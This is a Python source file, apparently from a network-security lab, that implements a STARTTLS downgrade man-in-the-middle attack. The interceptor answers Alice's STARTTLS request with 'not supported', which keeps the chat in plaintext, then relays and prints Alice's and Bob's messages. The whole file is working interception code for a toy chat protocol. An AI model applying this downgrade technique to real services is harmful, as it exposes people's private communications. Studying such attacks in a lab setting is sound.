import select, socket, queue as Queue
import chat_utils as chat_utils
from colorama import Fore, Style

#This class implements the downgrade attack which Trudy does by blocking the chat_STARTTLS messages between Alice and Bob.

class Downgrade_Server:
    #Setting up the downgrade server with IP address and port 8000.
    def __init__(self, self_ip, server_ip, client_ip):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self_ip, 8000))
        self.server.listen(5)
        print(Fore.GREEN + Style.BRIGHT + 'Server up and running! Waiting for connections...\n')

        #Intercepting connections from the client to server.
        connection, client_address = self.server.accept()
        new_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #Connecting to the server to now establish an indirect link between a client and server
        new_socket.connect((server_ip, 8000))
        print(Fore.CYAN + Style.BRIGHT + "Intercepting messages...\n")
        # Setting the connection to non blocking, so that the Trudy can send and recieve messages whenever.
        self.server.setblocking(0)
        new_socket.setblocking(0)
        self.start_downgrade(connection, new_socket)

    def start_downgrade(self, client_side, server_side):
        #Setting up the client side and server side of the downgrade server
        self.client_side = client_side
        self.server_side = server_side
        # The list of input streams present.
        self.inputs = [client_side, server_side]
        # The list of entities with pending outgoing messages.
        self.outputs = []
        # message queues for the pending outgoing messages.
        self.message_queues = {}
        # A message queue for the pending outgoing messages to the client.
        self.message_queues[client_side] = Queue.Queue()
        # A message queue for the pending outgoing messages to the server.
        self.message_queues[server_side] = Queue.Queue()
        # Lists to contain the received fragments of a message untill all of its fragments have arrived.
        self.fragment_lists = {}
        # A list to contain the received fragments of a message untill all of its fragments have arrived on the client side.
        self.fragment_lists[client_side] = []
        # A list to contain the received fragments of a message untill all of its fragments have arrived on the server side.
        self.fragment_lists[server_side] = []
        # The number of messages sent so far.
        self.received_message_numbers = {}
        self.received_message_numbers[client_side] = 0
        self.received_message_numbers[server_side] = 0
        self.lastline_type = client_side
        # Now running a loop for as long as the connection between the server and client exists.
        while len(self.inputs) > 1:
            # Using the select library to filter the inputs and outputs list and obtain from them the entities that are ready for IO.
            readable, writable, exceptional = select.select(self.inputs, self.outputs, self.inputs)
            # Iterating over all the entities that have pending messages to be read
            for s in readable:
                incoming_msg = s.recv(4096).decode('UTF-8')
                # If the entity is the client, then there is an incoming message from the client to the server.
                if s is client_side:
                    #If the incoming message from client is to establish TLS connection,downgrade server responds with CHAT_STARTTLS_NOT_SUPPORTED.
                    #This message is not sent to the server so server assumes that the client doesn't wish to use TLS protocol.
                    if incoming_msg == chat_utils.CHAT_STARTTLS:
                        # Adding the server to the outputs list, implying that there are pending messages to be sent to the server.
                        if client_side not in self.outputs:
                            self.outputs.append(client_side)
                        response = chat_utils.CHAT_STARTTLS_NOT_SUPPORTED
                        self.message_queues[client_side].put(response)
                    # Other incoming messages thus read are enqueued into the message queue, implying that it has to be sent to the server.
                    else:
                        self.message_queues[server_side].put(incoming_msg)
                        if server_side not in self.outputs:
                            # Adding the server to the outputs list, implying that there are pending messages to be sent to the server.
                            self.outputs.append(server_side)
                        if chat_utils.CHAT_MESSAGE in incoming_msg:
                            self.handle_new_message(s, incoming_msg)
                # If the entity is the server, then there is an incoming message from the server to the client.
                else:
                    # The message thus read is enqueued into the message queue, implying that it has to be sent to the client.
                    self.message_queues[client_side].put(incoming_msg)
                    # Adding the client to the outputs list, implying that there are pending messages to be sent to the client.
                    if client_side not in self.outputs:
                        self.outputs.append(client_side)
                    if chat_utils.CHAT_MESSAGE in incoming_msg:
                        self.handle_new_message(s, incoming_msg)

            # Now iterating over the list of entities that have pending messages to be written to.
            for s in writable:
                try:
                    next_msg = self.message_queues[s].get_nowait()
                except Queue.Empty:
                    self.outputs.remove(s)
                else:
                    # If the user types CHAT_CLOSE, it means that he intends to close the connection.
                    if next_msg == chat_utils.CHAT_CLOSE:
                        person = 'Bob'
                        if s is server_side:
                            person = 'Alice'
                        print(Fore.RED + Style.BRIGHT + '\n' + person +' closed the connection!', Style.RESET_ALL+'\n')
                        s.send(next_msg.encode('UTF-8'))
                        self.close_connection(s)
                        break
                    else:
                        # If the message is not CHAT_CLOSE, then in accordance with the protocol,the message is sent.
                        s.send(next_msg.encode('UTF-8'))
            # Iterating over the list of entities that have thrown an exception.
            for s in exceptional:
                self.close_connection(s)

    # This function handles the messages received from the user.
    def handle_new_message(self, s, data):
        # First the details of the message like the message number, number of fragments and the fragment number are obtained.
        msg_num, num_fragments, fragment_num = chat_utils.get_message_details(data)
        # if the message number is not equal to the number of messages received yet, it implies that this is a new message.
        if self.received_message_numbers[s] != msg_num:
            self.received_message_numbers[s] = msg_num
            # If the new message has only one fragment, then we just print it.
            if num_fragments == 1:
                self.print_message(s, data[28:])
            # If it has more than one fragment then we append it into the fragment list.
            else:
                self.fragment_lists[s].append(data)
        # If the message received is not an entirely new message but a fragment of a message,
        else:
            # If the fragment received is indeed the last fragment, then we can parse all the received fragments, reconstruct the message and display it.
            if num_fragments == fragment_num:
                self.fragment_lists[s].append(data)
                received_msg = chat_utils.parse(self.fragment_lists[s])
                self.print_message(s, received_msg)
                self.fragment_lists[s].clear()
            # If the received fragment is not the last fragment, then we simply append it into the fragment list.
            else:
                self.fragment_lists[s].append(data)

    # This is a handy function to print the messages.
    def print_message(self, s, message):
        if self.lastline_type != s:
            print("")
            self.lastline_type = s
        if s is self.client_side:
            print(Fore.YELLOW + Style.BRIGHT +'Alice says: ', Fore.BLUE + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
        else:
            print(Fore.MAGENTA + Style.BRIGHT +'Bob says: ', Fore.GREEN + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
    

    # This is a handy function to help with the closing of the connection.
    def close_connection(self, s):
        if s in self.outputs:
            self.outputs.remove(s)
        self.inputs.remove(s)
        s.close()
        del self.message_queues[s]
        del self.received_message_numbers[s]
        del self.fragment_lists[s]
